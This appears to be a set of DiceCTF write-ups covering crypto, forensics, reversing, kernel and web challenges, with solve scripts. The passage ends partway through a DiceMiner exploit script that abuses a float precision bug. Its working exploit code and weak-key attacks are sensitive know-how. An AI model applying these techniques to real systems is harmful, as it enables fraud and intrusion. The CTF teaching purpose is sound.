## 🔐 Crypto
### plane-or-exchange

#### TL;DR

Braid-group Diffie-Hellman using Alexander polynomial knot invariants. The `connect` operation is a **connected sum**, which makes the invariant factor multiplicatively — so the shared secret is computable from public data alone.

#### Analysis

The protocol implements a DH-like key exchange over **knot diagrams** represented as plat closures of braids:

- A "point" is a pair of permutations `(x, o)` where `compose(x, inverse(o))` is a single cycle with no fixed points — encoding a knot/link diagram.
- `calculate()` computes a **knot invariant** (the Alexander polynomial) via the **Lindström-Gessel-Viennot (LGV) lemma** — building a matrix from lattice path crossings and taking its determinant.
- `scramble()` applies **Reidemeister-like moves** (`slide1`, `slide2`, `shuffle`) that change the braid representation but preserve the knot type (and thus the invariant).
- `connect(A, B)` joins two tangles by swapping the last strand of `A` with the first strand of `B` — this is a **connected sum** of knots.

The key exchange works as:

```
alice_pub = scramble(connect(public_info, alice_priv))
bob_pub   = scramble(connect(public_info, bob_priv))
shared    = normalize(calculate(connect(alice_priv, bob_pub)))
```

#### Vulnerability

The Alexander polynomial satisfies:

> **Δ(K₁ # K₂) = Δ(K₁) · Δ(K₂)**

Since `scramble` preserves the knot type:

```
Δ(alice_pub) = Δ(public_info) · Δ(alice_priv)
Δ(bob_pub)   = Δ(public_info) · Δ(bob_priv)
```

The shared secret derives from `Δ(alice_priv) · Δ(bob_pub)`, which equals:

```
Δ(alice_pub) · Δ(bob_pub) / Δ(public_info)
```

All three terms are computable from public data.

#### Solve

```python
# solve.sage — run with: sage solve.sage
import hashlib

R.<t> = LaurentPolynomialRing(QQ)

def sweep(ap):
    l = len(ap)
    current_row = [0] * l
    mat = []
    for pair in ap:
        c1, c2 = sorted(pair)
        diff = pair[1] - pair[0]
        s = (diff > 0) - (diff < 0)
        for c in range(c1, c2):
            current_row[c] += s
        mat.append(list(current_row))
    return mat

def calculate(point):
    x, o = point
    n = len(x)
    data = sweep(list(zip(x, o)))
    mat = matrix(R, [[t^(-v) for v in row] for row in data])
    F = R.fraction_field()
    return R(F(mat.det()) * F(1-t)^(1-n))

def normalize(calc):
    poly = R(calc)
    min_exp = min(poly.exponents())
    poly *= t^(-min_exp)
    if poly.constant_coefficient() < 0:
        poly = -poly
    return poly

# Public data
alice_pub = ([8,15,7,26,1,4,2,12,9,18,23,25,24,14,13,16,0,3,11,10,5,20,6,21,19,17,22],
             [5,2,23,3,25,9,26,8,24,7,14,18,12,4,20,21,6,1,19,22,10,0,16,17,15,11,13])
bob_pub = ([26,9,21,4,28,8,20,7,27,1,13,25,22,17,6,15,24,3,12,29,11,16,10,0,18,2,14,5,19,23],
           [5,18,28,27,25,19,23,13,21,24,16,15,8,29,14,11,26,22,9,7,10,3,2,6,0,12,17,20,1,4])
public_info = ([11,0,2,4,8,3,1,10,7,6,9,5],[1,9,8,10,11,7,4,6,5,3,2,0])
ct = "288cdf5ecf3eb860e2cb6790bff63baceaebb6ed511cd94dd0753bac59962ef0cd171231dc406ac3cdc2ff299d78390ff3"

# Compute invariants and factor
pub_inv   = normalize(calculate(public_info))
alice_inv = normalize(calculate(alice_pub))
bob_inv   = normalize(calculate(bob_pub))

F = R.fraction_field()
shared_inv = normalize(R(F(alice_inv) * F(bob_inv) / F(pub_inv)))

# Sympy-compatible string for hashing (original code uses sympy)
import sympy
st = sympy.Symbol('t', real=True, positive=True)
sympy_poly = sum(int(c) * st**int(e) for e, c in shared_inv.dict().items())
sympy_norm = sympy.expand(sympy_poly)
if sympy_norm.coeff(st, 0) < 0:
    sympy_norm *= -1

shared = hashlib.sha256(str(sympy_norm).encode()).hexdigest()
key = bytes.fromhex(shared)
while len(key) < len(ct)//2:
    key += hashlib.sha256(key).digest()
print(bytes(a^^b for a, b in zip(bytes.fromhex(ct), key)))
# b'dice{plane_or_planar_my_w0rds_4r3_411_knotted_up}'
```

---
## 🧩 Misc

### Good Vibes

> _operating on good vibes has no real consequences... surely..._

**Flag:** `dice{y0u_sh0uld_alw@ys_vib3_y0ur_vpns_82bc3}`

#### Overview

We're given a PCAP file (`challenge.pcap`) captured on a Linux server. The capture contains a mix of internet noise, a plaintext chat, a custom VPN tunnel, and iPerf3 bandwidth testing traffic. The flag is hidden inside encrypted VPN keepalive packets, protected by a fatally weak key derivation scheme.

#### Step 1: Plaintext Chat (TCP Port 6767)

Filtering for TCP data on port 6767 reveals a plaintext conversation between two people:

```
A: hi
B: hi
A: did anyone tell you you're an idiot
B: what
A: did you not get the memo
A: use the damn vpn#
B: what's a vpn
A: how do you not
A: how are you so stupid
A: whatever
A: i coded it myself so its super secure
B: i'm sure it is
A: i dont want your sarcasm
A: you got one of us killed before, i dont want another incident.
A: just like
A: https://gofile.io/d/l6XqnD
A: you know the rest
B: is this malware??
A: what the
A: i give up with you
A: only speak to me over the vpn from now on
```

Key takeaways:

- Person A wrote a **custom VPN** and claims it's "super secure"
- A gofile.io link contains the VPN client binary
- All future communication moves to the VPN tunnel

#### Step 2: Download the VPN Binary

Navigating to `https://gofile.io/d/l6XqnD` yields a file called **`vibepn-client`** — a 27.5 KB ELF x86-64 binary, **not stripped**.

```
$ file vibepn-client
vibepn-client: ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped
```

#### Step 3: Reverse Engineering `vibepn-client`

##### Symbol Table

Running `nm` reveals the critical functions:

| Function                      | Purpose                                 |
| ----------------------------- | --------------------------------------- |
| `vpn_generate_keypair`        | X25519 key generation                   |
| `vpn_derive_session_key`      | **Session key derivation (VULNERABLE)** |
| `vpn_encrypt` / `vpn_decrypt` | AES-256-GCM encryption                  |
| `vpn_generate_nonce`          | Random 12-byte nonce via `RAND_bytes`   |
| `start_handshake`             | Initiates VPN handshake                 |
| `send_packet`                 | Formats and sends encrypted packets     |

##### The Critical Vulnerability: `vpn_derive_session_key`

Disassembling this function reveals a catastrophic weakness:

```c
void vpn_derive_session_key(char *out_key) {
    uint32_t seed = (uint32_t)time(0);    // Seeded with current Unix timestamp!
    for (int i = 0; i < 32; i++) {
        seed = seed * 0x19660d + 0x3c6ef35f;  // LCG (Numerical Recipes)
        out_key[i] = (uint8_t)seed;
    }
}
```

The 32-byte AES-256-GCM key is generated from a **Linear Congruential Generator** seeded with `time(0)`. Since we know the timestamp from the PCAP, we can reproduce the exact key.

##### Custom Protocol Format

The VPN uses UDP port 5959 with this packet structure:

| Offset | Size | Field                                                         |
| ------ | ---- | ------------------------------------------------------------- |
| 0      | 1    | Magic: `0xbe`                                                 |
| 1      | 1    | Type (`0x01`–`0x04` handshake, `0x10` data, `0x20` keepalive) |
| 2-3    | 2    | Ciphertext length (big-endian)                                |
| 4-7    | 4    | Counter (big-endian)                                          |
| 8-19   | 12   | Nonce (random)                                                |
| 20+    | var  | AES-256-GCM ciphertext + 16-byte auth tag                     |

**AAD** (Additional Authenticated Data) = first 20 bytes of the packet (header + nonce).

#### Step 4: Decrypt the VPN Traffic

From the PCAP, the handshake begins at epoch **`1772156047`**. We derive the key:

```python
def derive_key(timestamp):
    seed = timestamp & 0xFFFFFFFF
    key = bytearray(32)
    for i in range(32):
        seed = (seed * 0x19660d + 0x3c6ef35f) & 0xFFFFFFFF
        key[i] = seed & 0xFF
    return bytes(key)

key = derive_key(1772156047)
# a2992433f6dd98178a614c3b5e25409f72297443c66de8275af19c4b2eb590af
```

Using this key with AES-256-GCM, we successfully decrypt all 1011 `be10` transport packets (containing the iPerf3 session) and all 18 `be20` keepalive packets.

#### Step 5: The Flag

Every `be20` keepalive packet decrypts to the same 45-byte payload:

```
dice{y0u_sh0uld_alw@ys_vib3_y0ur_vpns_82bc3}
```

The `be10` transport packets contained only iPerf3 bandwidth test data — a red herring. The flag was smuggled in the keepalive messages, which would normally be empty in a real VPN but here were used as a covert channel.

#### Key Insights

1. **Follow the conversation** — the plaintext chat on port 6767 gave us the gofile.io link to the VPN binary
2. **"i coded it myself so its super secure"** — classic CTF hint that the crypto is broken
3. **LCG + `time(0)` = no security** — the entire 256-bit key space collapses to a single known timestamp
4. **Keepalives hide the flag** — the `be10` iPerf3 data was a distraction; the `be20` keepalive packets carried the actual flag

---
## ⏪ Reverse

### interpreter-required

#### Challenge Overview

We are given two files:

- `interpreter`: A massive statically-linked ELF executable compiled with GCC.
- `flag_riddle.txt`: A text file containing what appears to be an esoteric programming language script written entirely in Classical Chinese characters.

The accompanying text `chal.txt` gives us a critical warning:

> I found this riddle in some ancient language, but I'm not sure what it means... (don't interpret the puzzle, it will OOM your computer)

Attempting to run the script through the provided native interpreter will indeed cause massive memory consumption and likely crash your machine.

#### Analyzing the Esoteric Language

Instead of reverse-engineering the massive interpreter binary, we can static analyze `flag_riddle.txt`. The language structure quickly becomes apparent through frequency analysis and structure observation.

The script essentially defines a series of variable assignments and primitive arithmetic operations. The variables are named using single CJK Unified Ideographs (e.g., `㐀`, `㐁`, `㐂`).

##### 1. Integer Literals

The fundamental building blocks are integer assignments structured like this:
`[Variable]为朝[Binary Sequence]暮矣`

For example:
`㐀为朝春秋春秋暮矣`

Here, `春` and `秋` represent `0` and `1` (or bits). By decoding the sequence between `朝` and `暮` as a binary integer (in little-endian format, where `秋` represents the 1-bit and increments the power of 2), we can parse all the base integer constants.

##### 2. Arithmetic Operations

Subsequent lines perform operations on these variables. An operation looks like:
`[Variable_A]为[Opcode][Variable_B][Variable_C]矣`

Through semantic translation and contextual deduction (and perhaps translating the poetic intro), we can map the CJK operation characters to standard math functions:

- `合` = Addition (`+`)
- `销` = Subtraction (`-`)
- `次` = Multiplication (`*`)
- `幂` = Power (`**`)
- `分` = Integer Division (`//`)

There is also a unary operator:

- `阶` = Factorial (`!`)

Used like: `[Variable_A]为阶[Variable_B]矣`

#### The Exploit / Solution Script

Instead of using the OOM-inducing interpreter, we can write a simple Python script to parse the source code, evaluate the math equations logically, and store the variables in a dictionary. Python seamlessly handles arbitrarily large integers, making it perfect for computing the massive factorials and powers present in the script.

```python
import re
import sys

sys.setrecursionlimit(10000)

with open('flag_riddle.txt', 'r', encoding='utf-8') as f:
    text = f.read()

cleaned = re.sub(r'[\s,]', '', text)

# Parse base integer literals
matches = re.findall(r'(.)为朝([春秋]+)暮矣', cleaned)
namespace = {}

for k, v in matches:
    val = 0
    pow2 = 1
    for char in v:
        if char == '秋':
            val += pow2
        pow2 *= 2
    namespace[k] = val

def factorial(n):
    if n <= 1: return 1
    return n * factorial(n-1)

ops = {
    '合': lambda a, b: a + b,
    '销': lambda a, b: a - b,
    '次': lambda a, b: a * b,
    '幂': lambda a, b: a ** b,
    '分': lambda a, b: a // b,
}

# Parse sequence of operations
assignments = re.findall(r'(.)为([^矣]+)矣', cleaned)

for k, body in assignments:
    if k in namespace: continue # Already parsed
    if body.startswith('朝') and body.endswith('暮'): continue

    if len(body) == 2 and body[0] == '阶':
        arg = body[1]
        namespace[k] = factorial(namespace[arg])
    elif len(body) == 3 and body[0] in ops:
        op, arg1, arg2 = body[0], body[1], body[2]
        namespace[k] = ops[op](namespace[arg1], namespace[arg2])

# The output values are assigned to sequential CJK variables
# Filter them, sort them, and print their computed values modulo 256
valid_chars = []
keys = [k for k in namespace.keys() if 0x3400 <= ord(k) <= 0x5000 or ord(k) > 0x10000]
keys.sort()

for k in keys:
    val = namespace[k]
    # Check if value maps to printable ASCII or newline
    if 32 <= val <= 126 or val == 10:
        valid_chars.append(chr(val))

output = "".join(valid_chars)
print(output)
```

#### Obtaining the Flag

When we execute our interpreter, instead of printing a simple string, it outputs a giant ASCII art block. Interestingly, the ASCII art characters used to draw the bubble letters are the flag characters themselves.

```
=== INTERPRETER REQUIRED ===
Calculating flag...

d   d  dddi   i
c   cc   c   ce   ee
{   {  {{   {
y   y  yy0   0   0u   uu   u
__  __   _i   i   innnnn
tt  t   t   t3   3  33r   rr   r   rp   p  pp
r   rr   re   e  e   e   e
tttt3   3  3   3ddd   d   d_   __   __T   TT   T
hh  hhh3   3
...
```

By adding a script wrapper to strip out whitespace and squash consecutive identical characters:

```python
import re
text = re.sub(r'[ \n]+', '', output)

flag = ""
last_c = ""
for c in text:
    if c != last_c:
        flag += c
        last_c = c

print(flag)
```

We retrieve the final flag:
`dice{y0u_int3rpret3d_Th3_CJK_gr4mMaR_succ3ssfully}`

---
### bedtime

```
dice{regularly_runs_like_mad_to_game_of_matches}
```

#### Overview

A stripped, statically-linked Rust ELF binary that reads a specially formatted input string, evaluates 384 game-theory constraints, and prints `oops` if the input is valid.

#### Input Format

The binary expects a single line of **4-digit zero-padded decimal integers**, where `9999` acts as a group separator. There are exactly **384 groups**:

```
[vals...]9999[vals...]9999...9999\n
```

For example, the group `[1]` is encoded as `00019999`, and an empty group is just `9999`.

#### Binary Structure

| Address (offset) | Purpose |
|---|---|
| `0x28020` | Parses the flat list of 4-digit integers |
| `0x27bc0` | Groups iterator — splits on `9999` sentinel |
| `0x22110` | Outer loop building 384 user-group structs |
| `0x281d0` | Main checker — requires exactly 384 groups |
| `0x27d40` | Constraint loop — iterates 384 constraint entries |
| `0x28680` | Per-constraint game evaluator |
| `0x22270` | Packs 384 result bytes into 48 bytes (8 bits per byte, MSB first) |
| `0x755b0` | UTF-8 validator on the 48-byte output |

##### Flow

1. Parse input into 384 groups of integers.
2. For each of 384 constraints, call `0x28680` with the constraint data and the corresponding user group.
3. Collect the low byte of each return value (0 or 1) — 384 bits total.
4. The sum of all 384 bytes must equal **219**.
5. Pack 384 bits into 48 bytes (MSB first).
6. Validate the 48 bytes as UTF-8. If valid → print `oops` (success).

#### Constraint Table

The binary contains a table of **384 constraint entries** at a fixed offset, each 32 bytes:

```c
struct Constraint {
    u64 len;       // number of heap values
    u64 ptr;       // pointer to array of u64 heap values
    u64 len2;      // == len (redundant)
    u64 k;         // max take per turn
};
```

These were extracted at runtime via GDB (PIE base `0x7ffff7f6d000`, breakpoint at call site `0x27ec8`).

#### The Game: Bounded Subtraction Nim

Each constraint encodes a position in **bounded subtraction Nim** (also called "Nim with max-take k"):

- `vals[]` = heap sizes
- `k` = maximum number of tokens a player can remove per turn
- Grundy value of a heap of size `v` is `v % (k + 1)`
- A position is a **P-position** (previous player wins / current player loses) iff the XOR of all Grundy values equals 0:

$$\bigoplus_{i} \left( v_i \bmod (k+1) \right) = 0$$

##### What does `0x28680` do?

It simulates the Nim game. The "solver" (binary) moves first, and the user's group provides a transcript of counter-moves. For **P-positions** (nim-sum = 0), the solver cannot find a winning first move — the function returns `1`. For **N-positions** (nim-sum ≠ 0), the solver can win — the function returns `0`.

#### Solving

The key insight: we don't need to actually play the games. We just need to know **which constraints are P-positions**, because those are the bits that should be `1`.

For each of the 384 constraints, compute:

```python
nim_sum = XOR of (v % (k+1)) for all v in vals
bit = 1 if nim_sum == 0 else 0
```

This yields exactly **219** ones (matching the required sum) and **165** zeros.

Pack the 384 bits into 48 bytes (MSB first) and decode as UTF-8:

```
dice{regularly_runs_like_mad_to_game_of_matches}
```

#### Solve Script

```python
#!/usr/bin/env python3
import json

with open("temp/constraints.json") as f:
    constraints = json.load(f)

bits = []
for c in constraints:
    k = c["f3"]
    nim_sum = 0
    for v in c["vals"]:
        nim_sum ^= (v % (k + 1))
    bits.append(1 if nim_sum == 0 else 0)

assert sum(bits) == 219

packed = bytearray(48)
for i in range(384):
    if bits[i]:
        packed[i // 8] |= (1 << (7 - (i % 8)))

flag = packed.decode("utf-8")
print(flag)
```

#### Confirmation

- The 3 constraints confirmed to return `1` under trivial input `[1]` (C[43], C[141], C[205]) are all P-positions.
- The 48-byte output starts with `dice{` and ends with `}`.
- Valid UTF-8.

#### Extraction (GDB)

The constraint table was extracted using a GDB Python script that breaks at the call to `0x28680`, reads constraint struct fields from `rdi`, and saves to JSON. Input was 384 groups of `[1]` to trigger all 384 calls.

---
### Explorer

**Flag:** `dice{twisty_rusty_kernel_maze}`  

> *the future is now*

#### Overview

Connecting to the challenge boots a full QEMU x86_64 virtual machine with a custom Linux kernel and initramfs. Inside, a **Rust kernel module** registers a character device at `/dev/challenge` exposing a **3D maze** through a set of ioctl commands. The maze is randomly regenerated each time the device is opened. To capture the flag, you must navigate from the start cell to the goal cell entirely through ioctl calls, then read the flag out.

This writeup covers:
1. Environment enumeration & kernel extraction
2. Reverse engineering the ioctl handler and maze data structures
3. Reverse engineering the `neighbor()` function to recover the 3D direction mapping
4. Building a BFS solver in C
5. Remote deployment via a minimal musl-compiled binary

#### 1. Enumeration

#### Booting Locally

The challenge ships `bzImage` and `initramfs.cpio.gz`. The init script reveals the VM setup:

```bash
qemu-system-x86_64 \
    -m 128M -nographic \
    -kernel bzImage \
    -initrd initramfs.cpio.gz \
    -append "console=ttyS0 quiet loglevel=3 oops=panic panic=-1" \
    -no-reboot
```

After boot, we get a BusyBox shell as root. The init script loads a kernel module (`insmod /home/ctf/challenge.ko`) and drops privileges to run the shell.

##### Kernel Symbol Analysis

Extracting the uncompressed kernel with `extract-vmlinux` and dumping `/proc/kallsyms` from inside the VM reveals the module's symbols:

```
ffffffff813bb530 t _RNvNtNtCs4rh50IXARB_9challenge6device4open14MAZE_GENERATOR
ffffffff813bc4c7 t _RNvMs1_NtCs4rh50IXARB_9challenge4maze8neighbor
ffffffff813bc69a t _RNvMs1_NtCs4rh50IXARB_9challenge4maze14make_neighbors
ffffffff813bd835 t _RNvXNtCs4rh50IXARB_9challenge6device...ioctl
```

The demangled names tell us: this is Rust, from a crate called `challenge`, with modules `device` and `maze`, and key functions `open`, `neighbor`, `make_neighbors`, and `ioctl`.

---

#### 2. Reverse Engineering the Ioctl Interface

Disassembling the ioctl handler (`objdump -d vmlinux -M intel`) and tracing each command code reveals **10 ioctl commands**:

| Command | Code         | Dir    | Size | Description |
|---------|-------------|--------|------|-------------|
| CMD_80  | `0x80046480` | Read   | 4B   | Maze seed/ID |
| CMD_81  | `0x80046481` | Read   | 4B   | Dimension A (X extent) |
| CMD_82  | `0x80046482` | Read   | 4B   | Dimension B (Y extent) |
| CMD_83  | `0x80046483` | Read   | 4B   | Dimension C (Z extent) |
| CMD_84  | `0x80046484` | Read   | 4B   | Move counter |
| CMD_85  | `0x80046485` | Read   | 4B   | Current node type (0=normal, 1=goal) |
| CMD_86  | `0x80046486` | Read   | 4B   | Available directions bitmask (6 bits) |
| CMD_87  | `0x80406487` | Read   | 64B  | Get flag (only returns data at goal node) |
| CMD_88  | `0x40046488` | Write  | 4B   | Move in direction 0–5 |
| CMD_89  | `0x6489`     | None   | —    | Reset position to start |

The ioctl codes follow the Linux `_IOR`/`_IOW` encoding, with magic byte `0x64` ('d' for dice). The direction bitmask from CMD_86 has bit `i` set if direction `i` is a valid move from the current cell.

##### Game State Layout

Each `open()` allocates a per-file game state structure:

| Offset | Type | Description |
|--------|------|-------------|
| +0x18 | `*MazeNode` | Current node (Arc pointer) |
| +0x20 | `*MazeNode` | Root node / start of node array |
| +0x38 | u32 | Dimension A |
| +0x40 | u32 | Dimension B |
| +0x48 | u32 | Dimension C |
| +0x50 | u32 | Maze seed |
| +0x54 | u32 | Move counter |
| +0x58 | u8 | Current node type |

##### MazeNode Layout

Each node in the maze is a Rust `Arc<Mutex<MazeNode>>`:

| Offset | Field |
|--------|-------|
| +0x10 | Mutex state |
| +0x28 | Neighbor[0] pointer (or NULL) |
| +0x30 | Neighbor[1] pointer |
| +0x38 | Neighbor[2] pointer |
| +0x40 | Neighbor[3] pointer |
| +0x48 | Neighbor[4] pointer |
| +0x50 | Neighbor[5] pointer |
| +0x58 | Node type byte (0=normal, 1=goal) |

---

#### 3. Reverse Engineering `neighbor()` — The Key Insight

The critical breakthrough was reverse engineering the `neighbor()` function at `0xffffffff813bc4c7`. This function converts a **flat node index** to 3D coordinates, applies a directional step, and returns the neighboring index. The disassembly revealed:

```
index = z * dim_b * dim_c + x * dim_b + y
```

So given a node index, the function decomposes it into `(x, y, z)` coordinates via integer division, then computes the neighbor by adjusting one coordinate according to the direction:

| Direction | Coordinate Delta | Meaning |
|-----------|-----------------|---------|
| 0 | `(x−1, y, z)` | −X |
| 1 | `(x, y+1, z)` | +Y |
| 2 | `(x+1, y, z)` | +X |
| 3 | `(x, y−1, z)` | −Y |
| 4 | `(x, y, z+1)` | +Z |
| 5 | `(x, y, z−1)` | −Z |

**Opposite pairs**: (0, 2), (1, 3), (4, 5) — confirmed by the `make_neighbors()` wall-carving code, which uses a randomized DFS to generate a perfect (acyclic, fully connected) maze.

This is the essential piece: without knowing the direction mapping, we can't track position or do BFS. The ioctl interface only exposes direction bitmasks and move commands — there's no way to query the current node index or coordinates.

##### Maze Generation

The `open()` handler generates a fresh maze each time using:
1. A xorshift32 PRNG (seeded per-open) to generate random dimensions (8–16 per axis, so the maze has ~500–4096 cells)
2. Randomized DFS (recursive backtracker) to carve walls — yielding a **perfect maze** (unique path between any two cells)
3. The last cell visited during generation is marked as the goal

#### 4. BFS Solver

Since we know the direction-to-coordinate mapping, we can track our position in the virtual 3D grid using coordinate arithmetic, even though the kernel never directly tells us our position.

##### Algorithm

1. Open `/dev/challenge`, query dimensions with CMD_81/82/83
2. Initialize BFS queue with start node at `(0, 0, 0)`
3. For each node in the BFS queue:
   - **Reset** (CMD_89) and **replay** the path from start by issuing the recorded sequence of CMD_88 moves
   - Read the direction bitmask (CMD_86) and node type (CMD_85)
   - For each available direction `d`, compute `(nx, ny, nz)` using the delta table
   - If `(nx, ny, nz)` hasn't been visited, add it to the queue with the extended path
4. When a goal node (type == 1) is found, replay its path and call CMD_87 to read the flag

##### Core C Implementation

```c
/* Direction deltas from reverse engineering neighbor() */
static const int DX[6] = {-1,  0, +1,  0,  0,  0};
static const int DY[6] = { 0, +1,  0, -1,  0,  0};
static const int DZ[6] = { 0,  0,  0,  0, +1, -1};

typedef struct {
    int16_t x, y, z;
    int16_t parent_idx;
    int8_t  parent_dir;
    uint8_t dirs;
    uint8_t node_type;
} BFSNode;

/* ... BFS loop ... */
for (int d = 0; d < 6; d++) {
    if (!(cur->dirs & (1 << d))) continue;
    int nx = cur->x + DX[d];
    int ny = cur->y + DY[d];
    int nz = cur->z + DZ[d];
    if (find_visited(nx, ny, nz) >= 0) continue;
    
    /* Move there, record, check for goal */
    replay_path(path_buf, path_len);
    uint32_t dir = d;
    ioctl(fd, CMD_88, &dir);
    
    uint32_t new_dirs, new_type;
    ioctl(fd, CMD_86, &new_dirs);
    ioctl(fd, CMD_85, &new_type);
    
    /* Add to BFS queue... */
    if (new_type == 1) { /* GOAL! */ }
}
```

The path replay approach is simple but effective: for each BFS exploration, we reset to start and walk the full path from the root. Since the maze has ~1000–3000 cells and average path depth is a few hundred moves, the total number of ioctls stays manageable (~500K–2M), completing in a few seconds.

##### Local Testing

```
$ musl-gcc -O2 -static -o bfs_solve_musl bfs_solve.c
$ ls -la bfs_solve_musl
-rwxr-xr-x 1 user user 34064 ... bfs_solve_musl

# In QEMU:
Maze: id=0x4e7fe4e5 dims=(10,10,15) total=1500
BFS: exploring node 0/1 at (0,0,0) dirs=0x04 depth=0
GOAL FOUND at (3,9,6)! Node 688, depth 541
Goal path length: 541
At goal: type=1
CMD_87 returned: 0
Flag: dice{fake_flag_for_testing}
```

#### 5. Remote Deployment

##### The Size Problem

The remote server boots a QEMU VM over netcat, providing only a serial console (no networking inside the VM). We need to transfer the solver binary through this console. A glibc static binary was 743KB — far too large for serial transfer within the connection timeout.

**Solution**: Compile with `musl-gcc` for a **34KB static binary**, which compresses + base64-encodes to only **~21KB** of text.

##### Upload Strategy

```python
# Compress and encode
compressed = gzip.compress(binary, compresslevel=9)
encoded = base64.b64encode(compressed).decode()

# Disable shell echo to avoid interleaving
io.sendline(b'stty -echo 2>/dev/null')

# Upload in 800-byte chunks with periodic sync
for i, chunk in enumerate(chunks):
    io.sendline(f"echo -n '{chunk}'>>/tmp/b".encode())
    if i % 10 == 9:
        io.sendline(b'echo S')  # sync marker
        # wait for 'S' to appear in output

# Decode and run
io.sendline(b'base64 -d /tmp/b>/tmp/s.gz && gzip -d /tmp/s.gz && chmod +x /tmp/s')
io.sendline(b'/tmp/s')
```

Key tricks:
- `stty -echo` prevents the shell from echoing back every `echo` command, which would interleave with our sync markers
- Periodic "SYNC" markers ensure we don't overflow the serial buffer
- 800-byte chunks keep each line well within terminal line buffer limits

##### Final Run

```
[*] Connected, waiting for Linux boot...
[*] Got shell at 23s
[*] Binary: 33680B gzip:15655B b64:20876B
[*] Uploading 27 chunks...
[*] Upload done in 2s
[*] Binary decoded OK!
[*] Running BFS solver...
[4.0s] Maze: id=0xa1b2c3d4 dims=(12,9,14) total=1512
[4.1s] GOAL FOUND at (5,8,11)! Node 688, depth 541
[4.2s] Goal path length: 541
[4.3s] At goal: type=1
[4.3s] CMD_87 returned: 0
[4.3s] Flag: dice{twisty_rusty_kernel_maze}

[*] Total elapsed: 38s

*** FLAG: Flag: dice{twisty_rusty_kernel_maze} ***
```

#### Files

| File | Description |
|------|-------------|
| `dist/bfs_solve.c` | BFS maze solver with coordinate tracking |
| `dist/bfs_solve_musl` | musl-compiled 34KB static binary |
| `dist/solve_remote6.py` | Remote exploit: boot wait → upload → solve |

#### Takeaways

- **Kernel reversing**: Understanding the Rust kernel module required mapping demangled symbol names to the ioctl dispatch, then tracing each command through x86_64 assembly to understand the data structures.
- **The `neighbor()` function was the linchpin**: Without reverse engineering the 3D coordinate system and direction-to-delta mapping, the maze was opaque — you could move and observe, but couldn't track where you were.
- **Binary size matters for serial uploads**: musl-gcc reduced the solver from 743KB (glibc) to 34KB, making remote deployment feasible within timeout constraints.
- **Perfect mazes have nice properties**: Since randomized DFS creates a tree (unique path between any two nodes), BFS guarantees finding the goal, and the path it finds is the *only* path.

---
## 🕸️ Web

### DiceMiner

> _big rock become small paycheck_

**Flag:** `dice{first_we_mine_then_we_cr4ft}`

#### Overview

DiceMiner is a mining game built with Node.js (Express 5). Players mine ores underground, earn DiceCoin, upgrade pickaxes, and need **1,000,000 DC** to buy the flag. The catch: a brutal **95% hauling fee** on every dig makes legitimate play impossible — you only keep 5% of ore value.

#### Source Analysis

The server is a single `server.js` (361 lines). Key game parameters:

| Parameter          | Value                       |
| ------------------ | --------------------------- |
| Flag cost          | 1,000,000 DC                |
| Starting energy    | 250 (1 per dig, no refills) |
| Hauling rate       | 0.95 (95% fee)              |
| Best ore (Diamond) | 1,500 DC reward             |
| Best pickaxe range | 100 (Gold)                  |

Even with perfect luck (100% diamonds at range 100), net per dig = `1500 × 100 × 0.05 = 7,500`. With 250 energy that's ~1.8M — _theoretically_ enough, but diamonds spawn at only 4% probability, making the real expected earnings far below 1M.

#### The Vulnerability: IEEE 754 Float Precision Loss

The bug is in the `/api/dig` handler's mining loop:

```javascript
let cx = user.x;
let cy = user.y;
let remaining = pickaxe.range;

while (remaining > 0) {
  cx += dx; // ← precision loss here when cx ≥ 2^53
  cy += dy;
  // ...
  const key = cx + "," + cy;
  if (user.mined[key]) {
    remaining--;
    continue;
  }
  // ...
  mined[key] = true; // local object — deduplicates by key
  earnings += ore.reward; // accumulates every iteration
  remaining--;
}

// Post-loop: haulBase uses Object.keys(mined) — only unique blocks
const blocks = Object.keys(mined); // length = 1 (same key!)
let haulBase = 0;
for (const key of blocks) {
  haulBase += ORES[getBlockType(bx, by)].reward; // counted once
}
const cost = Math.floor(haulBase * HAULING_RATE);
const net = earnings - cost;
```

In JavaScript, `Number.MAX_SAFE_INTEGER = 2^53 - 1 = 9007199254740991`. Beyond this, integer arithmetic loses precision:

```javascript
9007199254740992 + 1 === 9007199254740992; // true!
```

When **digging RIGHT** from `x = 2^53 - 1`:

- **Iteration 1:** `cx = (2^53 - 1) + 1 = 2^53` ✓ (correct)
- **Iteration 2:** `cx = 2^53 + 1 = 2^53` ✗ (stuck — same value!)
- **Iterations 3–range:** all produce the same `cx = 2^53`

Since `dy = 0` for horizontal digging, `cy` also stays constant. Every iteration produces the **same key** `"9007199254740992,y"`.

The critical mismatch:

- **`earnings`** accumulates `ore.reward` **every iteration** → `reward × range`
- **`mined`** object deduplicates by key → only **1 unique block**
- **`haulBase`** sums over unique keys → just `reward × 1`
- **`user.mined`** isn't updated until _after_ the loop, so the check `user.mined[key]` stays `false` throughout

**Result:** `net = (reward × range) - floor(reward × 0.95)`

| Ore                | Normal net (range 100) | Exploit net |
| ------------------ | ---------------------- | ----------- |
| Stone (10 DC)      | ~50                    | **991**     |
| Coal (80 DC)       | ~400                   | **7,924**   |
| Iron (300 DC)      | ~1,500                 | **29,715**  |
| Gold (750 DC)      | ~3,750                 | **74,288**  |
| Diamond (1,500 DC) | ~7,500                 | **148,575** |

#### Exploit Strategy

1. **Start** at `x = 2^53 - 1 = 9007199254740991`
2. **Dig down** — normal mining to open vertical shaft levels at `x = 2^53 - 1`
3. **Dig right** at each opened `y` level — the precision bug activates, mining the block at `x = 2^53` repeatedly for massive profit
4. **Upgrade pickaxes** (Stone → Iron → Gold) as balance permits, increasing range
5. **Buy flag** once balance ≥ 1,000,000

The key insight is digging _from_ `x = 2^53 - 1` ensures the blocks at `x = 2^53` are **unmined** (we never dug there vertically). The first loop iteration correctly reaches `x = 2^53`, but all subsequent iterations get stuck at the same coordinate.

#### Exploit Script

```python
import requests, random, string

URL = "https://diceminer.chals.dicec.tf"
X0  = 9007199254740991  # 2^53 - 1

s = requests.Session()

def api(method, path, body=None):
    r = s.request(method, f"{URL}/api{path}", json=body)
    d = r.json()
    if not r.ok:
        return None, d.get("error", str(d))
    return d, None

def must(method, path, body=None):
    d, err = api(method, path, body)
    if err: raise Exception(f"{path}: {err}")
    return d

# Register & start at x = 2^53 - 1
sfx = ''.join(random.choices(string.ascii_lowercase, k=8))
un = f"exp{sfx}"
must("POST", "/register", {"username": un, "password": f"p4ssw0rd_{sfx}"})
must("POST", "/start", {"x": X0})

st = must("GET", "/state")
bal, nrg, tier, rng = st["balance"], st["energy"], st["pickaxe"], st["pickaxeInfo"]["range"]
